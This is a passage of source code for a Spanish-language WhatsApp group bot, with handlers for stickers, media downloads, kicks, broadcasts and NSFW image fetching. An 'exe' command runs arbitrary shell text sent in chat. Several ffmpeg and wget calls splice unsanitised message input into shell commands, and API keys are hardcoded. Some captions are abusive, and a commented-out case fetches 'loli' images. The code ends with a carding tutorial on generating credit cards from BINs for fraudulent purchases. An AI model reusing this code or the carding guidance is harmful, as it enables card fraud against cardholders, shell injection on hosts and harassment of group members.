					anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*DESCARGA EXITOSA ✅*\n◉ *Título* : ${anu.title}\n\n*ESPERE ENVIANDO SU ARCHIVO MP4 ⚠*`
					thumb = await getBuffer(anu.thumb)
					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek})
					break
			        case 'tts':
				   client.updatePresence(from, Presence.recording) 
				   if (args.length < 1) return client.sendMessage(from, 'Cual es el código de idioma?\n\nPara saber el codigo de idioma coloque el comando ${prefix}idioma', text, {quoted: mek})
                                   if (!isUser) return reply(mess.only.daftarB)
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return client.sendMessage(from, 'Y el texto?', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? reply('Texto muy largo kk')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return reply('Gagal om:(')
							client.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					break
                                case 'listadmins':
				case 'adminlist':
					client.updatePresence(from, Presence.composing) 
                                        if (!isUser) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group)
					teks = `Lista De los admins mas facheros del Grupo*${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			case 'setprefix':
					client.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.ownerB)
					prefix = args[0]
					reply(`El prefijo se ha cambiado correctamente a : ${prefix}`)
					break
			case 'todos':
			case 'tagall':
				client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
                                        if (!isUser) return reply(mess.only.daftarB)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `  Total : ${groupMembers.length}\n`
					for (let mem of groupMembers) {
						teks += `╠➥ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions('╔══✪〘 MENCIONANDO 〙✪══\n╠➥'+teks+'╚═〘 By Joseph 〙', members_id, true)
					break
                                case 'send':
					var pc = body.slice(6)
					var nomor = pc.split("|")[0];
					var pesan = pc.split("|")[1];
					client.sendMessage(nomor+'@s.whatsapp.net', pesan, text)
					break
				case 'setppbot':
				client.updatePresence(from, Presence.composing) 
				if (!isQuotedImage) return reply(`Sube fotos con subtítulos ${prefix}Ok`)
					if (!isOwner) return reply(mess.only.ownerB)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
					await client.updateProfilePicture(botNumber, media)
					reply('Gracias por el nuevo perfil')
					break
				case 'bc':
					client.updatePresence(from, Presence.composing) 
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `*「 TRANSMISIÓN 」*\n\n${body.slice(4)}`})
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 Joseph 」*\n\n${body.slice(4)}`)
						}
						reply('Transmisión exitosa')
					}
					break
					case 'bcgc':
					client.updatePresence(from, Presence.composing) 
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('.......')
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of groupMembers) {
							client.sendMessage(_.jid, buff, image, {caption: `*「 GRUPO BC 」*\n*Grupo* : ${groupName}\n\n${body.slice(6)}`})
						}
						reply('')
					} else {
						for (let _ of groupMembers) {
							sendMess(_.jid, `*「 BC GROUP 」*\n*Group* : ${groupName}\n\n${body.slice(6)}`)
						}
						reply('Grupo de transmisión exitoso')
					}
					
                     case 'leave':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isGroupAdmins) return reply(mess.only.admin)
                     setTimeout( () => {
					client.groupLeave (from) 
					}, 2000)
                     setTimeout( () => {
					client.updatePresence(from, Presence.composing) 
					client.sendMessage(from, 'Adios, Ojala no regreses 👋', text) // ur cods
					}, 0)
                     break
       /*case 'ownergrup':
				  case 'ownergroup':
               client.updatePresence(from, Presence.composing) 
              options = {
          text: `El Dueño de este grupo es :@${from.split("-")[0]}`, 
          contextInfo: { mentionedJid: [from] }
           }
           client.sendMessage(from, options, text, { quoted: mek } )
				break*/
                                      case 'kick':
					case 'pafuera':
					client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marca al que vamos a funar')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Pedido recibido, adios no te extrañaremos kk 👋 :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
                                                }
						mentions(teks, mentioned, true)
						client.groupRemove(from, mentioned)
					} else {
						mentions(`Pedido recibido con éxito, adiós no te extrañaremos kk 👋 : @${mentioned[0].split('@')[0]}`, mentioned, true)
						client.groupRemove(from, mentioned)
					client.sendMessage(mentioned, 'Chao puta gorda', text)
					}
					break
				case 'exe':
	              client.updatePresence(from, Presence.composing) 
	             if (!isGroup) return reply(mess.only.group)
                     if (!isUser) return reply(mess.only.daftarB)
		     if (!isOwner) return reply(mess.only.ownerB)
		      const cmd = body.slice(5)
	               exec(cmd, (err, stdout) => {
		           if(err) return client.sendMessage(from, "NO VEMO GILE ✋🥸🤚", text, { quoted: mek })
		           if (stdout) {
			       client.sendMessage(from, stdout, text, { quoted: mek })
		           }
	           })
                  break
                                        case 'antilink':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Coloque *antimenu para ver los comandos')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('El antilink ya esta activo')
						antilink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('❬ ✅ ❭ La funcion de antilink esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nEl antilink esta activo\n\nY solo los admins de este grupo podran pasar el enlace\n\nSi algun participante que no se admin envía un enlace de este grupo u otro grupo sera expulsado de este grupo de inmediato`, text)
					} else if (Number(args[0]) === 0) {
						antilink.splice(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('❬ ✅ ❭ La funcion de antilink esta deshabilitada en este grupo')
					} else {
						reply('Coloque /help para ver los comandos')
					}
					break
			        case 'linkgroup':
				case 'linkgrup':
				case 'linkgc':
				    client.updatePresence(from, Presence.composing) 
				    if (!isGroup) return reply(mess.only.group)
                                     if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await client.groupInviteCode (from)
					yeh = `ᴀQᴜɪ ᴇꜱᴛᴀ ᴇʟ ʟɪɴᴋ ᴅᴇʟ ɢʀᴜᴘᴏ :3\n\nhttps://chat.whatsapp.com/${linkgc}\n\nLink Del Grupo *${groupName}*`
					client.sendMessage(from, yeh, text, {quoted: mek, detectLinks: false})
					break
                case 'qrcode':
                buff = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?data=${body.slice(8)}&size=1080%C3%971080`)
				client.sendMessage(from, buff, image, {quoted: mek})
				break
		          		
			case 'closegc':
					client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					var nomor = mek.participant
					const close = {
					text: `Grupo cerrado por el administrador @${nomor.split("@s.whatsapp.net")[0]}\nAhora *solo los administradores* puede enviar mensajes`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
					break
                case 'opengc':
                case 'bukagc':
					client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					open = {
					text: `Grupo abierto por el administrador @${sender.split("@")[0]}\nAhora *todos los participantes* pueden enviar mensajes`,
					contextInfo: { mentionedJid: [sender] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, false)
					client.sendMessage(from, open, text, {quoted: mek})
					break
				                case 'attp':
						if (!isUser) return reply(mess.only.daftarB)
					        if (args.length < 1) return reply(`¿Dónde está el texto?\n*Ejemplo:* ${prefix}attp shanduy`)
						reply(mess.only.attp)
					        attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
						client.sendMessage(from, attp2, MessageType.sticker, {quoted: mek})
						break
				case 's':
				case 'tucson':
				case 'opa':
				case 'shan':
				case 'nefasto':
				case 'stiker':
				case 'sticker':
				case 'stickergif':
				case 'stikergif':
			        if (!isUser) return reply(mess.only.daftarB)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(pack, author)} ${ran} -o ${ran}`, async (error) => {
									 if (error) {
											 reply(ind.stikga())
											 fs.unlinkSync(media)	
											 fs.unlinkSync(ran)
											 }
									client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.only.pegatina)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`[❗] Fallo, al momento de convertir ${tipe} al sticker`)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(pack, author)} ${ran} -o ${ran}`, async (error) => {
									if (error) {
											 reply(ind.stikga())
											 fs.unlinkSync(media)	
											 fs.unlinkSync(ran)
											 }
									client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)
									fs.unlinkSync(ran)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else {
						reply(`Envíe una imagen con el comando ${prefix}s o etiqueta a una imagen que ya se haya enviado`)
					}
					break
			            case 'toimg':
				    client.updatePresence(from, Presence.composing)
                                    if (!isUser) return reply(mess.only.daftarB)
					if (!isQuotedSticker) return reply('❌ Solo stickers')
					reply(mess.only.imgs)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ No se pudo convertir el sticker en imágenes')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: '*⌈ Imagen convertida ✅ ⌉*\n\nву ѕнαη∂υу'})
						fs.unlinkSync(ran)
					})
					break
                        case 'tomp3':
                	client.updatePresence(from, Presence.composing) 
                        if (!isUser) return reply(mess.only.daftarB)
					if (!isQuotedVideo) return reply('❌ Solo videos')
					reply(mess.only.mpcancion)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ No se pudo convertir el video a mp3')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
						fs.unlinkSync(ran)
					})
					break
                
		case 'play':   
	        if (args.length < 1) return reply('Donde esta el nombre de la canción?')
		if (!isUser) return reply(mess.only.daftarB)
                reply(mess.only.musica)
                play = body.slice(5)
                anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=hamilton20`)
               if (anu.error) return reply(anu.error)
                 infomp3 = `*⌈ Canción Encontrada ✅ ⌉*\n◉ *Título* : ${anu.result.title}\nFuente : ${anu.result.source}\nTamaño : ${anu.result.size}\n\n*ESPERE ENVIANDO SU ARCHIVO MP3 ⚠*`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_audio)
                client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                break
		case 'play2':   
	        if (args.length < 1) return reply('Donde esta el nombre de la canción?')
		if (!isUser) return reply(mess.only.daftarB)
                reply(mess.only.musica2)
                play = body.slice(5)
                anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=shanduy20`)
               if (anu.error) return reply(anu.error)
                 infomp3 = `*⌈ Canción Encontrada ✅ ⌉*\n◉ *Título* : ${anu.result.title}\nFuente : ${anu.result.source}\nTamaño : ${anu.result.size}\n\n*ESPERE ENVIANDO SU ARCHIVO MP3 ⚠*`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_audio)
                client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                break
                                case 'daftar':
					client.updatePresence(from, Presence.composing)
					if (isUser) return reply('Ya estas registrado:3')
					if (args.length < 1) return reply(`Incorrecto \nComando : ${prefix}daftar Nombre\nComando : ${prefix}daftar shanduy`)
					var reg = body.slice(8)
					var nombre = reg.split("|")[0];
                                                user.push(sender)
						fs.writeFileSync('./database/json/user.json', JSON.stringify(user))
						client.sendMessage(from, `\`\`\`REGISTRADO CON ÉXITO ✅\`\`HORA EC: ${time}\`\`\`\n\n\`\`\`FECHA: ${date}\`\`\`\n\n\`\`\`[USUARIO]: ${nombre}\`\`\`\n\`\`\`[NÚMERO]: wa.me/${sender.split("@")[0]}\`\`\`\n\`\`\`Para usar el bot\`\`\`\n\`\`\`Por favor\`\`\`\n\`\`\`enviar ${prefix}help\`\`\`\n\`\`\`\nTotal de usuários ${user.length}\`\`\``, text, {quoted: mek})
					break
                                case 'welcome':
					if (!isGroup) return reply(mess.only.group)
                                        if (!isUser) return reply(mess.only.daftarB)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Para activar está funcion coloca *welcome 1')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Ya esta activada!!!')
						welkom.push(from)
						fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
						reply('❬ ✅ ❭ La funcion de bienvenida esta habilitada en este grupo')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from)
						fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
						reply('❬ ✅ ❭ La funcion de bienvenida esta deshabilitada en este grupo')
					} else {
						reply('Escribe el comando 1 para activarlo y 0 para desactivarlo Ejemplo: *welcome 1')
					}
					break
                               case 'nsfwneko':
				    try{
						if (!isNsfw) return reply('❌ *NSFW NO ESTA ACTIVADO* ❌')
                                                if (!isUser) return reply(mess.only.daftarB)
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko?apikey=BotWeA`, {method: 'get'})
						buffer = await getBuffer(res.result)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'mesum'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
					break
                              	case 'nsfw':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Digita 1 para activar los NSFW')
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Recursos Activados ✅')
						nsfw.push(from)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply('❬ ✅ ❭ La funcion NSFW esta habilitado en este grupo')
					} else if (Number(args[0]) === 0) {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply('❬ ✅ ❭ La funcion NSFW esta deshabilitado en este grupo')
					} else {
						reply('Digite 1 para activarlo, 0 para desactivarlo')
					}
					break	
				case 'waifu':
					gatauda = body.slice(7)
					reply(mess.wait)
                                        if (!isUser) return reply(mess.only.daftarB)
					anu = await fetchJson(`https://arugaz.my.id/api/nekonime`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image,{quoted: mek})
					break
				case 'randomanime':
					gatauda = body.slice(13)
					reply(mess.wait)
                                        if (!isUser) return reply(mess.only.daftarB)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=BotWeA`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break						
                             case 'delete':
					case 'del':
					if (!isGroup)return reply(mess.only.group)
                                        if (!isUser) return reply(mess.only.daftarB)
		                        client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
                 case 'level':
                if (!isLevelingOn) return reply(mess.levelnoton)
                if (!isGroup) return reply(mess.only.group)
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(mess.levelnol)
                sem = sender.replace('@s.whatsapp.net','')
                resul = `◪ *LEVEL*\n  ├─ ❏ *Nombre* : ${sem}\n  ├─ ❏ *XP* : ${userXp}\n  └─ ❏ *Level* : ${userLevel}`
               client.sendMessage(from, resul, text, { quoted: mek})
                .catch(async (err) => {
                        console.error(err)
                        await reply(`Error!\n${err}`)
                    })
            break
				
            case 'leveling':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (args.length < 1) return reply('Digita 1 para ativar el recurso')
                if (args[0] === 1) {
                    if (isLevelingOn) return reply('*La función de nivel ya estaba activa*')
                    _leveling.push(groupId)
                    fs.writeFileSync('./database/json/leveling.json', JSON.stringify(_leveling))
                     reply(mess.levelon)
                } else if (args[0] === 0) {
                    _leveling.splice(groupId)
                    fs.writeFileSync('./database/json/leveling.json', JSON.stringify(_leveling))
                     reply(mess.leveloff)
                } else {
                    reply(` *Digita el comando 1 para activar, 0 para desactivar *\n * Ejemplo: ${prefix}leveling 1*`)
                }
            break
                                /*case 'nsfwtrap':
                                        try{
                                                if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
                                                if (!isUser) return reply(mess.only.daftarB)
                                                res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap?apikey=APIKEYLU`, {method: 'get'})
                                                buffer = await getBuffer(res.result)
                                                client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Estas enfermo flaco NEFASTOOOOO'})
                                        } catch (e) {
                                                console.log(`*Error* :`, color(e,'red'))
                                                reply('❌ *ERROR* ❌')
                                        }
										break*/
										case 'randomhentaio': 
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai?apikey=BotWeA`, {method: 'get'})
							buffer = await getBuffer(res.result)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Otaku que se esperaba'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					/*case 'nsfwloli':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://api.lolis.life/random?nsfw=true`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Alto pedofilo socio'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break*/
					case 'nsfwbobs': 
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/biganimetiddies`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Quiero ver tetas'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					case 'nsfwblowjob':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob`, {method: 'get'})
							buffer = await getBuffer(res.result)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'No antojen'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					case 'nsfwneko':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://api.computerfreaker.cf/v1/neko`, {method: 'get'})
							buffer = await getBuffer(res.result)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Pero que wea?'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					/*case 'nsfwyuri':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://api.computerfreaker.cf/v1/yuri`, {method: 'get'})
							buffer = await getBuffer(res.result)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'NEFASTOOOOOOO'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
					break*/
				case 'nsfwass':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`'https://meme-api.herokuapp.com/gimme/animebooty`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Ese es el culo que querías?'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					case 'nsfwsidebobs':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/sideoppai`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'La vieja de gabo, tremenda puta'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
					    break
					case 'nsfwahegao':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/ahegao`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Joder, quisiera follarmela'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					case 'nsfwthighs':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animethighss`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Por que muslos?'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
					case 'nsfwfeets':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animefeets`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'MMMMM PATAS'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌') 
						}
						break
					case 'nsfwarmpits':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animearmpits`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'A?'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
						case 'nsfwtoin':
						try {
							if (!isNsfw) return reply('❌ *NSFW Desactivado* ❌')
							res = await fetchJson(`https://tobz-api.herokuapp.com/nsfwtrap?apikey=BotWeA`, {method: 'get'})
							buffer = await getBuffer(res.url)
							client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Bro....'})
						} catch (e) {
							console.log(`Error :`, color(e,'red'))
							reply('❌ *ERROR* ❌')
						}
						break
                                case 'ping':    
			   	        if (!isUser) return reply(mess.only.userB)
                                        const timestamp = speed();
                                        const latensi = speed() - timestamp
                                        client.updatePresence(from, Presence.composing) 
				        uptime = process.uptime()
                                        client.sendMessage(from, `Velocidad: *${latensi.toFixed(4)} _Second_*\nDevice: *Alcatel Pixi 4*\nRAM: *6Mb*\nData: *10GB*\nJaringan: *2G*\nStatus: *Bateria Baja*`, text, { quoted: mek})
                                        break
                                case 'ttp':
					if (args.length < 1) return reply('Y el texto flaco?')
					ranp = getRandom('.png')
					rano = getRandom('.webp')
					teks = body.slice(4).trim()
					anu = await fetchJson(`https://mhankbarbar.tech/api/text2image?text=${teks}&apiKey=${BarBarKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						client.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break
					
					
                default:
                if (budy.includes(`/que es un bin`)) {
                  reply(`PARA LOS QUE NO SABEN HACER CUENTAS....ESTE ES UN TUTORIAL TEÓRICO PARA QUE SEPAN A LO QUE SE ESTAN METIENDO.

✅ ¿QUE ES UN BIN?

BIN: Bank Identification Number.

Un bin son los primeros 6 dígitos de una tarjeta de crédito. Estos nos sirven para identificar el país de procedencia, tipo de tarjeta y nivel de la misma.

Ejemplo: 553667

✅ ¿PARA QUE SIRVEN?

Con el bin puedes crear ccs (credit card) en español (tarjeta de crédito).Al generar la cc a base de bin puedes hacer suscripciones en páginas y hasta en ocasiones compras físicas. 

✅ ¿QUE ES UNA CC?

(CC=TARJETA DE CREDITO)

Primero debemos tener claro que una CC no es un BIN, una CC esta compuesta por información real.
Las CCs basicamente se componen por:

°Nombre
°Numero de la tarjeta
°CCV
°Fecha
°Dirección
°Código postal
°Pais
°Algunas traen numero telefónico y/o correo.

✅ ¿COMO RECONOCER EL TIPO DE TARJETA?

Pues Fácil. Observa:

La tarjeta comienza con el número 4 [Visa]

La tarjeta comienza con el número 5 [MasterCard]

La tarjeta comienza con el número 3 [Amex]

La tarjeta comienza con el número 6
[Discovey]

✅ ¿COMO CREAR UN BIN?

Un bin se hace a base de una cc real, solo debemos copiar los 6 primeros números de la cc y agregamos 10 equis (x)

Ejemplo: 4567812364745823

Bin: 456781xxxxxxxxxxx

Haciendo eso te pones a calar en páginas obvio con la misma ip de
la cc de la cual salió el bin.

✅ ¿EN QUE PAGINAS JALAN?

